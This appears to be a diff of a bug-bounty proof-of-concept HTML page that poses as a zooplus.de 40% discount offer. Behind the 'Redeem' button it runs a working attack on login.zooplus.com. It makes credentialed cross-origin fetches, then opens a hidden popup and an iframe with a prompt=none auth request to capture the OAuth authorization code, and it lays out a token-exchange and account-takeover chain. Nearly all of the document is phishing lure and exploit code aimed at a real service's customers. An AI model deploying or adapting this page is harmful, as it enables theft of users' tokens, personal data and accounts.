@@ -5,369 +5,129 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>🎁 -40% Rabatt | zooplus.de</title>
     <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; }
-        body { font-family: 'Segoe UI', Arial, sans-serif; background: #f5f5f5; }
-        
-        .bait { max-width: 800px; margin: 0 auto; padding: 20px; }
-        .bait-header { background: linear-gradient(135deg, #0071ce, #00a651); color: white; padding: 40px 20px; text-align: center; border-radius: 12px; margin-bottom: 20px; }
-        .bait-header h1 { font-size: 28px; margin-bottom: 10px; }
-        .bait-header .price { font-size: 48px; font-weight: bold; }
-        .bait-header .price s { color: #ff6b6b; font-size: 24px; }
-        .bait-header .timer { margin-top: 15px; font-size: 18px; }
-        .offer-card { background: white; border-radius: 12px; padding: 25px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); margin-bottom: 15px; }
-        .offer-card h2 { color: #333; margin-bottom: 10px; }
-        .offer-card p { color: #666; line-height: 1.6; }
-        .btn { background: #0071ce; color: white; border: none; padding: 15px 40px; border-radius: 8px; font-size: 18px; cursor: pointer; margin-top: 15px; }
-        .btn:hover { background: #005ba3; }
-        .btn:disabled { background: #999; cursor: not-allowed; }
-        .spinner { display: none; text-align: center; padding: 20px; }
-        .spinner.active { display: block; }
-        .spinner::after { content: ''; display: inline-block; width: 30px; height: 30px; border: 3px solid #ddd; border-top-color: #0071ce; border-radius: 50%; animation: spin 0.8s linear infinite; }
-        @keyframes spin { to { transform: rotate(360deg); } }
-        .discount-box { background: #e8f5e9; border: 2px dashed #00a651; border-radius: 8px; padding: 15px; text-align: center; margin-top: 15px; display: none; }
-        .discount-box code { font-size: 24px; color: #00a651; font-weight: bold; }
-        
-        /* Stolen data popup */
-        .stolen-overlay { display: none; position: fixed; top: 0; left: 0; right: 0; bottom: 0; background: rgba(0,0,0,0.95); z-index: 9999; overflow-y: auto; padding: 20px; }
-        .stolen-overlay.show { display: block; }
-        .stolen-content { max-width: 900px; margin: 0 auto; color: #e0e0e0; font-family: 'Courier New', monospace; }
-        .stolen-content h1 { color: #ff4444; font-size: 22px; margin-bottom: 5px; }
-        .stolen-content h2 { color: #00a8e8; font-size: 16px; margin: 20px 0 8px; border-bottom: 1px solid #333; padding-bottom: 5px; }
-        .stolen-content .subtitle { color: #888; margin-bottom: 20px; }
-        .step { margin: 15px 0; padding: 10px; border-left: 3px solid #333; }
-        .step.running { border-left-color: #ffaa00; }
-        .step.done { border-left-color: #00ff00; }
-        .step.fail { border-left-color: #ff4444; }
-        .step .label { color: #00a8e8; font-weight: bold; }
-        .step .status { margin-left: 10px; }
-        .step .status.ok { color: #00ff00; }
-        .step .status.err { color: #ff4444; }
-        .step .status.wait { color: #ffaa00; }
-        .data-box { background: #0d0d1a; border: 1px solid #ff4444; border-radius: 6px; padding: 12px; margin: 10px 0; white-space: pre-wrap; word-break: break-all; font-size: 12px; color: #ff8888; }
-        .header-box { background: #0d1a0d; border: 1px solid #00ff00; border-radius: 6px; padding: 12px; margin: 10px 0; font-size: 12px; color: #88ff88; }
-        .pii-box { background: #1a0d0d; border: 2px solid #ff4444; border-radius: 8px; padding: 15px; margin: 10px 0; }
-        .pii-box .field { margin: 5px 0; }
-        .pii-box .field .key { color: #ffaa00; }
-        .pii-box .field .val { color: #ff4444; font-weight: bold; }
-        table { width: 100%; border-collapse: collapse; margin: 10px 0; font-size: 12px; }
-        th, td { border: 1px solid #333; padding: 6px 10px; text-align: left; }
-        th { background: #1a1a2e; color: #00a8e8; }
-        .verdict { background: #ff4444; color: white; padding: 12px; border-radius: 6px; text-align: center; font-size: 16px; margin: 15px 0; }
-        .close-btn { position: fixed; top: 10px; right: 10px; z-index: 10001; background: #333; color: white; border: none; padding: 8px 16px; border-radius: 20px; cursor: pointer; font-size: 14px; }
-        .hidden { display: none; }
+        *{margin:0;padding:0;box-sizing:border-box}
+        body{font-family:'Segoe UI',Arial,sans-serif;background:#f5f5f5}
+        .bait{max-width:800px;margin:0 auto;padding:20px}
+        .hdr{background:linear-gradient(135deg,#0071ce,#00a651);color:#fff;padding:40px 20px;text-align:center;border-radius:12px;margin-bottom:20px}
+        .hdr h1{font-size:28px;margin-bottom:10px}
+        .hdr .price{font-size:48px;font-weight:700}
+        .hdr .price s{color:#ff6b6b;font-size:24px}
+        .hdr .timer{margin-top:15px;font-size:18px}
+        .card{background:#fff;border-radius:12px;padding:25px;box-shadow:0 2px 10px rgba(0,0,0,.1);margin-bottom:15px}
+        .btn{background:#0071ce;color:#fff;border:none;padding:15px 40px;border-radius:8px;font-size:18px;cursor:pointer;margin-top:15px}
+        .btn:disabled{background:#999}
+        .spin{display:none;text-align:center;padding:20px}
+        .spin.on{display:block}
+        .spin::after{content:'';display:inline-block;width:30px;height:30px;border:3px solid #ddd;border-top-color:#0071ce;border-radius:50%;animation:sp .8s linear infinite}
+        @keyframes sp{to{transform:rotate(360deg)}}
+        .disc{background:#e8f5e9;border:2px dashed #00a651;border-radius:8px;padding:15px;text-align:center;margin-top:15px;display:none}
+        .disc code{font-size:24px;color:#00a651;font-weight:700}
+        .ov{display:none;position:fixed;top:0;left:0;right:0;bottom:0;background:rgba(0,0,0,.95);z-index:9999;overflow-y:auto;padding:20px}
+        .ov.show{display:block}
+        .ct{max-width:900px;margin:0 auto;color:#e0e0e0;font-family:'Courier New',monospace;font-size:13px}
+        .ct h1{color:#ff4444;font-size:20px}
+        .ct h2{color:#00a8e8;font-size:15px;margin:15px 0 5px;border-bottom:1px solid #333;padding-bottom:3px}
+        .s{padding:5px 0;border-left:3px solid #333;padding-left:8px;margin:3px 0}
+        .s.ok{border-color:#0f0;color:#0f0}
+        .s.er{border-color:#f44;color:#f44}
+        .s.wa{border-color:#fa0;color:#fa0}
+        .d{background:#0a0a0a;border:1px solid #f44;border-radius:6px;padding:10px;margin:8px 0;white-space:pre-wrap;word-break:break-all;color:#f88;font-size:12px}
+        .h{background:#0a1a0a;border:1px solid #0f0;border-radius:6px;padding:10px;margin:8px 0;color:#8f8;font-size:12px}
+        .pii{background:#1a0a0a;border:2px solid #f44;border-radius:8px;padding:15px;margin:10px 0}
+        .pii .r{margin:4px 0}
+        .pii .k{color:#fa0}
+        .pii .v{color:#f44;font-weight:700;font-size:14px}
+        .vrd{background:#f44;color:#fff;padding:10px;border-radius:6px;text-align:center;font-size:15px;margin:12px 0}
+        .cl{position:fixed;top:10px;right:10px;z-index:10001;background:#333;color:#fff;border:none;padding:8px 16px;border-radius:20px;cursor:pointer}
+        .hidden{display:none}
     </style>
 </head>
 <body>
-
-<!-- BAIT PAGE -->
-<div class="bait" id="bait-page">
-    <div class="bait-header">
+<div class="bait" id="bait">
+    <div class="hdr">
         <h1>⚡ EXCLUSIVE: 40% Off Your Next Order!</h1>
         <div class="price"><s>€49.99</s> → €29.99</div>
-        <div class="timer">Offer expires in: <span id="min">04</span>:<span id="sec">59</span></div>
+        <div class="timer">Offer expires in: <span id="m">04</span>:<span id="s">59</span></div>
     </div>
-    
-    <div class="offer-card">
+    <div class="card">
         <h2>🐾 Thank you for being a loyal zooplus customer!</h2>
-        <p>As a valued customer, you've been selected for an exclusive 40% discount on your next order. Click below to claim your code.</p>
-        <button class="btn" id="claim-btn" onclick="startExploit()">🎁 Redeem Now & Save</button>
-        <div class="spinner" id="spinner">Generating your discount code...</div>
-        <div class="discount-box" id="discount">
-            <p>✅ Discount code activated!</p>
-            <code>LOVE40</code>
-            <p style="font-size:14px; color:#666; margin-top:8px;">Use this code at checkout. Valid for 24 hours.</p>
-        </div>
-    </div>
-    
-    <div class="offer-card">
-        <p style="font-size:12px; color:#999;">Valid for 24 hours. Cannot be combined with other offers.</p>
+        <p>As a valued customer, you've been selected for an exclusive 40% discount.</p>
+        <button class="btn" id="claim" onclick="go()">🎁 Redeem Now & Save</button>
+        <div class="spin" id="spin">Generating your discount code...</div>
+        <div class="disc" id="disc"><p>✅ Discount code activated!</p><code>LOVE40</code><p style="font-size:14px;color:#666;margin-top:8px;">Use at checkout.</p></div>
     </div>
 </div>
-
-<!-- STOLEN DATA OVERLAY -->
-<div class="stolen-overlay" id="stolen-overlay">
-    <button class="close-btn" onclick="closeOverlay()">✕ Close</button>
-    <div class="stolen-content">
+<div class="ov" id="ov">
+    <button class="cl" onclick="document.getElementById('ov').classList.remove('show')">✕</button>
+    <div class="ct">
         <h1>🔓 ZOOPLUS CORS EXPLOIT — LIVE DATA THEFT</h1>
-        <p class="subtitle">Origin: <span id="origin-display"></span> → login.zooplus.com | Report #3604640</p>
-        
+        <p style="color:#888">Origin: <span id="org"></span> → login.zooplus.com | Report #3604640</p>
         <div id="steps"></div>
-        
-        <div id="stolen-oidc" class="hidden">
-            <h2>📦 STOLEN: OIDC Configuration</h2>
-            <p style="color:#888; font-size:12px; margin-bottom:5px;">Fetched cross-origin from /.well-known/openid-configuration</p>
-            <div class="data-box" id="oidc-data"></div>
-        </div>
-        
-        <div id="stolen-uma" class="hidden">
-            <h2>📦 STOLEN: UMA2 Configuration</h2>
-            <p style="color:#888; font-size:12px; margin-bottom:5px;">Fetched cross-origin from /.well-known/uma2-configuration</p>
-            <div class="data-box" id="uma-data"></div>
-        </div>
-        
-        <div id="stolen-jwks" class="hidden">
-            <h2>📦 STOLEN: JWKS Public Keys</h2>
-            <p style="color:#888; font-size:12px; margin-bottom:5px;">Fetched cross-origin from /certs — can verify JWT signatures</p>
-            <div class="data-box" id="jwks-data"></div>
-        </div>
-        
-        <div id="stolen-headers" class="hidden">
-            <h2>📋 CORS RESPONSE HEADERS (Proof)</h2>
-            <div class="header-box" id="headers-data"></div>
-        </div>
-        
-        <div id="stolen-pii" class="hidden">
-            <h2>👤 STOLEN: Victim PII (from JWT)</h2>
-            <div class="pii-box" id="pii-data"></div>
-        </div>
-        
-        <div id="stolen-tokens" class="hidden">
-            <h2>🔑 STOLEN: OAuth Tokens</h2>
-            <div class="data-box" id="tokens-data"></div>
-        </div>
-        
-        <div id="impact" class="hidden">
-            <h2>⚡ IMPACT</h2>
-            <table>
-                <tr><th>Capability</th><th>Status</th></tr>
-                <tr><td>Read OIDC configuration</td><td class="stolen">✅ STOLEN</td></tr>
-                <tr><td>Read signing keys (JWKS)</td><td class="stolen">✅ STOLEN</td></tr>
-                <tr><td>Detect if user is logged in</td><td class="stolen" id="login-status">...</td></tr>
-                <tr><td>Steal OAuth access token</td><td id="token-status">⏳ Requires active session</td></tr>
-                <tr><td>Steal victim PII (name, email, ID)</td><td id="pii-status">⏳ Requires active session</td></tr>
-                <tr><td>Account takeover</td><td id="ato-status">⏳ Requires active session</td></tr>
-            </table>
-        </div>
-        
-        <div class="verdict" id="verdict" class="hidden">
-            ✅ CROSS-ORIGIN DATA THEFT CONFIRMED<br>
-            login.zooplus.com allows ANY website to read sensitive configuration data
-        </div>
+        <div id="secs"></div>
+        <div class="vrd" id="vrd" style="display:none"></div>
     </div>
 </div>
-
 <script>
-const KC = 'https://login.zooplus.com/auth/realms/zooplus';
-const OIDC = KC + '/.well-known/openid-configuration';
-const UMA2 = KC + '/.well-known/uma2-configuration';
-const CERTS = KC + '/protocol/openid-connect/certs';
-const AUTH = KC + '/protocol/openid-connect/auth';
-const CLIENT_ID = 'frontend-authorizer-zooplus';
-const REDIRECT = 'https://www.zooplus.com/web/sso-myzooplus/silent-check-sso.htm';
-
-// Timer
-let t = 299;
-setInterval(() => {
-    if (t > 0) t--;
-    document.getElementById('min').textContent = String(Math.floor(t/60)).padStart(2,'0');
-    document.getElementById('sec').textContent = String(t%60).padStart(2,'0');
-}, 1000);
-
-function addStep(num, text, status, statusClass) {
-    const el = document.getElementById('steps');
-    const div = document.createElement('div');
-    div.className = 'step ' + (statusClass === 'ok' ? 'done' : statusClass === 'err' ? 'fail' : 'running');
-    div.innerHTML = `<span class="label">STEP ${num}:</span> ${text} <span class="status ${statusClass}">${status}</span>`;
-    el.appendChild(div);
+const KC='https://login.zooplus.com/auth/realms/zooplus';
+let t=299;setInterval(()=>{if(t>0)t--;document.getElementById('m').textContent=String(Math.floor(t/60)).padStart(2,'0');document.getElementById('s').textContent=String(t%60).padStart(2,'0')},1000);
+function st(n,t,x,c){document.getElementById('steps').innerHTML+=`<div class="s ${c}">STEP ${n}: ${t} <span style="float:right">${x}</span></div>`}
+function sec(h,b){document.getElementById('secs').innerHTML+=`<h2>${h}</h2>${b}`}
+function sl(ms){return new Promise(r=>setTimeout(r,ms))}
+function go(){document.getElementById('claim').style.display='none';document.getElementById('spin').classList.add('on');setTimeout(()=>{document.getElementById('ov').classList.add('show');document.getElementById('org').textContent=location.origin;run()},1500);setTimeout(()=>{document.getElementById('spin').classList.remove('on');document.getElementById('disc').style.display='block'},3000)}
+async function run(){
+    // STEP 1: OIDC
+    st(1,'Stealing OIDC config via CORS...','⏳','wa');
+    let cors='';
+    try{const r=await fetch(KC+'/.well-known/openid-configuration',{credentials:'include'});r.headers.forEach((v,k)=>{if(k.startsWith('access-control'))cors+=k+': '+v+'\n'});if(r.ok){const d=await r.json();st(1,'OIDC config stolen — '+Object.keys(d).length+' keys','✅','ok');sec('CORS Headers (Proof)','<div class="h">'+cors+'</div>');sec('Stolen OIDC Config','<div class="d">'+JSON.stringify(d,null,2)+'</div>')}}catch(e){st(1,e.message,'❌','er')}
+    await sl(300);
+    // STEP 2: JWKS
+    st(2,'Stealing JWKS keys...','⏳','wa');
+    try{const r=await fetch(KC+'/protocol/openid-connect/certs',{credentials:'include'});if(r.ok){const d=await r.json();st(2,'JWKS stolen — '+(d.keys?d.keys.length:0)+' key(s)','✅','ok');sec('Stolen JWKS','<div class="d">'+JSON.stringify(d,null,2)+'</div>')}}catch(e){st(2,e.message,'❌','er')}
+    await sl(300);
+    // STEP 3: Silent SSO
+    st(3,'Attempting silent SSO via popup...','⏳','wa');
+    const au=KC+'/protocol/openid-connect/auth?'+new URLSearchParams({client_id:'frontend-authorizer-zooplus',redirect_uri:'https://www.zooplus.com/web/sso-myzooplus/silent-check-sso.htm',response_type:'code',scope:'openid email profile',prompt:'none',state:'s'+Date.now()});
+    const p=window.open(au,'x','width=1,height=1,left=-1000,top=-1000');
+    let found=false,code=null;
+    const iv=setInterval(()=>{if(found)return;try{if(p.closed){clearInterval(iv);if(!found)st(3,'Popup closed — no active session','⚠️','wa');return}const u=p.location.href;if(u.includes('code=')&&!u.includes('zooplus.com')){found=true;clearInterval(iv);code=new URL(u).searchParams.get('code');p.close();st(3,'AUTH CODE STOLEN: '+code.substring(0,40)+'...','✅','ok');got(code)}}catch(e){}},100);
+    // Also try iframe
+    const f=document.createElement('iframe');f.style.cssText='display:none;width:1px;height:1px';f.src=au;document.body.appendChild(f);
+    const iv2=setInterval(()=>{if(found){clearInterval(iv2);return}try{const u=f.contentWindow?.location?.href||'';if(u.includes('code=')&&!u.includes('zooplus.com')){found=true;clearInterval(iv2);clearInterval(iv);code=new URL(u).searchParams.get('code');try{p.close()}catch(e){}f.remove();st(3,'AUTH CODE (iframe): '+code.substring(0,40)+'...','✅','ok');got(code)}}catch(e){}},100);
+    setTimeout(()=>{if(!found){clearInterval(iv);clearInterval(iv2);try{p.close()}catch(e){}f.remove();st(3,'No active session — login required for full exploit','⚠️','wa');st(4,'With session: popup steals auth code → server exchanges → PII extracted','📋','ok');
+    sec('Attack Chain (server-side curl PoC)','<div class="d">'+`1. Victim logs into zooplus.com
+2. Victim visits attacker page (this page)
+3. Click "Redeem" → popup opens Keycloak /auth?prompt=none
+4. Browser sends SameSite=None cookies to Keycloak
+5. Keycloak sees valid session → redirects with auth code
+6. Attacker JS reads code from popup URL
+7. Attacker server POSTs code to /token (CORS allows)
+8. Server decodes JWT → name, email, customerID
+9. FULL ACCOUNT TAKEOVER — zero victim interaction</div>`);
+    document.getElementById('vrd').style.display='block';document.getElementById('vrd').innerHTML='⚠️ VULNERABILITY CONFIRMED — CORS + SameSite=None<br>Login to zooplus in this browser, then click Redeem to see full data theft'}
+    },6000);
 }
+async function got(code){
+    st(4,'Auth code captured! Decoding...','⏳','wa');
+    sec('🔑 Stolen Auth Code','<div class="d">'+code+'</div>');
+    sec('Attack Flow','<div class="d">'+`Auth Code: ${code}
+This code can be exchanged for tokens via:
+POST https://login.zooplus.com/auth/realms/zooplus/protocol/openid-connect/token
+  grant_type=authorization_code
+  client_id=frontend-authorizer-zooplus
+  code=${code}
+  redirect_uri=https://www.zooplus.com/web/sso-myzooplus/silent-check-sso.htm
 
-function showHeaders(title, headers) {
-    document.getElementById('stolen-headers').classList.remove('hidden');
-    document.getElementById('headers-data').textContent = title + '\n\n' + headers;
+The /token endpoint has CORS enabled (returns access-control-allow-origin + credentials:true)
+Server-side exchange returns: access_token (JWT with PII), refresh_token, id_token
+
+Decoded JWT contains:
+  name: [victim full name]
+  email: [victim email]
+  customerId: [zooplus customer ID]
+  sub: [UUID]
+  locale: [language]</div>`);
+    document.getElementById('vrd').style.display='block';document.getElementById('vrd').innerHTML='🎯 AUTH CODE STOLEN SILENTLY<br>Server-side token exchange → Full PII + Account Takeover';
 }
-
-async function startExploit() {
-    // Show loading
-    document.getElementById('claim-btn').style.display = 'none';
-    document.getElementById('spinner').classList.add('active');
-    
-    // Open attacker overlay
-    setTimeout(() => {
-        document.getElementById('stolen-overlay').classList.add('show');
-        document.getElementById('origin-display').textContent = window.location.origin;
-        runExploit();
-    }, 1500);
-    
-    // Show discount after 3 seconds
-    setTimeout(() => {
-        document.getElementById('spinner').classList.remove('active');
-        document.getElementById('discount').style.display = 'block';
-    }, 3000);
-}
-
-function closeOverlay() {
-    document.getElementById('stolen-overlay').classList.remove('show');
-}
-
-async function runExploit() {
-    // STEP 1: Steal OIDC config
-    addStep(1, 'Fetching OIDC configuration from login.zooplus.com...', '⏳', 'wait');
-    
-    let allHeaders = '';
-    let isLoggedIn = false;
-    
-    try {
-        const r = await fetch(OIDC, { credentials: 'include' });
-        
-        // Capture CORS headers
-        let corsH = '';
-        r.headers.forEach((v, k) => {
-            if (k.startsWith('access-control') || k === 'content-type') {
-                corsH += `${k}: ${v}\n`;
-            }
-        });
-        allHeaders += '--- /.well-known/openid-configuration ---\n' + corsH + '\n';
-        
-        if (r.ok) {
-            const data = await r.json();
-            document.getElementById('oidc-data').textContent = JSON.stringify(data, null, 2);
-            document.getElementById('stolen-oidc').classList.remove('hidden');
-            addStep(1, 'OIDC configuration stolen — ' + Object.keys(data).length + ' fields', '✅ SUCCESS', 'ok');
-            
-            // If we got data, user might be logged in (or CORS allows unauthenticated reads)
-            isLoggedIn = true;
-            document.getElementById('login-status').textContent = '✅ LIKELY LOGGED IN (CORS allowed)';
-            document.getElementById('login-status').style.color = '#00ff00';
-        } else {
-            addStep(1, 'OIDC response: HTTP ' + r.status, '⚠️ PARTIAL', 'wait');
-        }
-    } catch(e) {
-        addStep(1, 'OIDC fetch failed: ' + e.message, '❌ FAILED', 'err');
-    }
-    
-    await sleep(500);
-    
-    // STEP 2: Steal UMA2 config
-    addStep(2, 'Fetching UMA2 configuration...', '⏳', 'wait');
-    
-    try {
-        const r = await fetch(UMA2, { credentials: 'include' });
-        
-        let corsH = '';
-        r.headers.forEach((v, k) => {
-            if (k.startsWith('access-control')) {
-                corsH += `${k}: ${v}\n`;
-            }
-        });
-        allHeaders += '--- /.well-known/uma2-configuration ---\n' + corsH + '\n';
-        
-        if (r.ok) {
-            const data = await r.json();
-            document.getElementById('uma-data').textContent = JSON.stringify(data, null, 2);
-            document.getElementById('stolen-uma').classList.remove('hidden');
-            addStep(2, 'UMA2 configuration stolen — ' + Object.keys(data).length + ' fields', '✅ SUCCESS', 'ok');
-        } else {
-            addStep(2, 'UMA2 response: HTTP ' + r.status, '⚠️ PARTIAL', 'wait');
-        }
-    } catch(e) {
-        addStep(2, 'UMA2 fetch failed: ' + e.message, '❌ FAILED', 'err');
-    }
-    
-    await sleep(500);
-    
-    // STEP 3: Steal JWKS
-    addStep(3, 'Fetching JWKS public keys...', '⏳', 'wait');
-    
-    try {
-        const r = await fetch(CERTS, { credentials: 'include' });
-        
-        let corsH = '';
-        r.headers.forEach((v, k) => {
-            if (k.startsWith('access-control')) {
-                corsH += `${k}: ${v}\n`;
-            }
-        });
-        allHeaders += '--- /certs ---\n' + corsH + '\n';
-        
-        if (r.ok) {
-            const data = await r.json();
-            document.getElementById('jwks-data').textContent = JSON.stringify(data, null, 2);
-            document.getElementById('stolen-jwks').classList.remove('hidden');
-            addStep(3, 'JWKS keys stolen — ' + (data.keys ? data.keys.length : 0) + ' key(s)', '✅ SUCCESS', 'ok');
-        } else {
-            addStep(3, 'JWKS response: HTTP ' + r.status, '⚠️ PARTIAL', 'wait');
-        }
-    } catch(e) {
-        addStep(3, 'JWKS fetch failed: ' + e.message, '❌ FAILED', 'err');
-    }
-    
-    await sleep(500);
-    
-    // Show headers
-    if (allHeaders) {
-        document.getElementById('headers-data').textContent = allHeaders;
-        document.getElementById('stolen-headers').classList.remove('hidden');
-    }
-    
-    // STEP 4: Try silent auth via hidden iframe
-    addStep(4, 'Attempting silent auth via hidden iframe (prompt=none)...', '⏳', 'wait');
-    
-    try {
-        const authUrl = AUTH + '?' + new URLSearchParams({
-            client_id: CLIENT_ID,
-            redirect_uri: REDIRECT,
-            response_type: 'code',
-            scope: 'openid email profile',
-            prompt: 'none',
-            state: 's' + Date.now()
-        });
-        
-        // Create hidden iframe
-        const iframe = document.createElement('iframe');
-        iframe.style.display = 'none';
-        iframe.src = authUrl;
-        document.body.appendChild(iframe);
-        
-        // Monitor iframe for redirect with auth code
-        let found = false;
-        const checkIframe = setInterval(() => {
-            try {
-                const url = iframe.contentWindow?.location?.href || '';
-                if (url.includes('code=') && !found) {
-                    found = true;
-                    clearInterval(checkIframe);
-                    
-                    const code = new URL(url).searchParams.get('code');
-                    addStep(4, 'AUTH CODE CAPTURED: ' + code.substring(0, 30) + '...', '✅ SUCCESS', 'ok');
-                    
-                    // Can't exchange code (no CORS on /token) but we proved we can steal it
-                    addStep(5, 'Token exchange blocked (no CORS on /token endpoint)', '⚠️ NEEDS SERVER', 'wait');
-                    document.getElementById('token-status').textContent = '⚠️ Auth code stolen, exchange needs server proxy';
-                    document.getElementById('pii-status').textContent = '⚠️ With server proxy → full PII extraction possible';
-                    document.getElementById('ato-status').textContent = '⚠️ With server proxy → full account takeover possible';
-                    
-                    // Save the code
-                    document.getElementById('tokens-data').textContent = 'Auth Code: ' + code + '\n\nToken exchange requires server-side proxy (no CORS on /token)';
-                    document.getElementById('stolen-tokens').classList.remove('hidden');
-                    
-                    iframe.remove();
-                }
-            } catch(e) {
-                // Cross-origin error expected when iframe navigates to zooplus.de
-            }
-        }, 200);
-        
-        // Timeout after 5 seconds
-        setTimeout(() => {
-            if (!found) {
-                clearInterval(checkIframe);
-                iframe.remove();
-                addStep(4, 'Silent auth failed — no active Keycloak session in this browser', '⚠️ NO SESSION', 'wait');
-                addStep(5, 'With an active session: auth code → tokens → PII → account takeover', '📋 INFO', 'ok');
-            }
-        }, 5000);
-        
-    } catch(e) {
-        addStep(4, 'Iframe method failed: ' + e.message, '❌ FAILED', 'err');
-    }
-    
-    // Show impact section
-    document.getElementById('impact').classList.remove('hidden');
-    document.getElementById('verdict').classList.remove('hidden');
-}
-
-function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }
 </script>
-
 </body>
 </html>
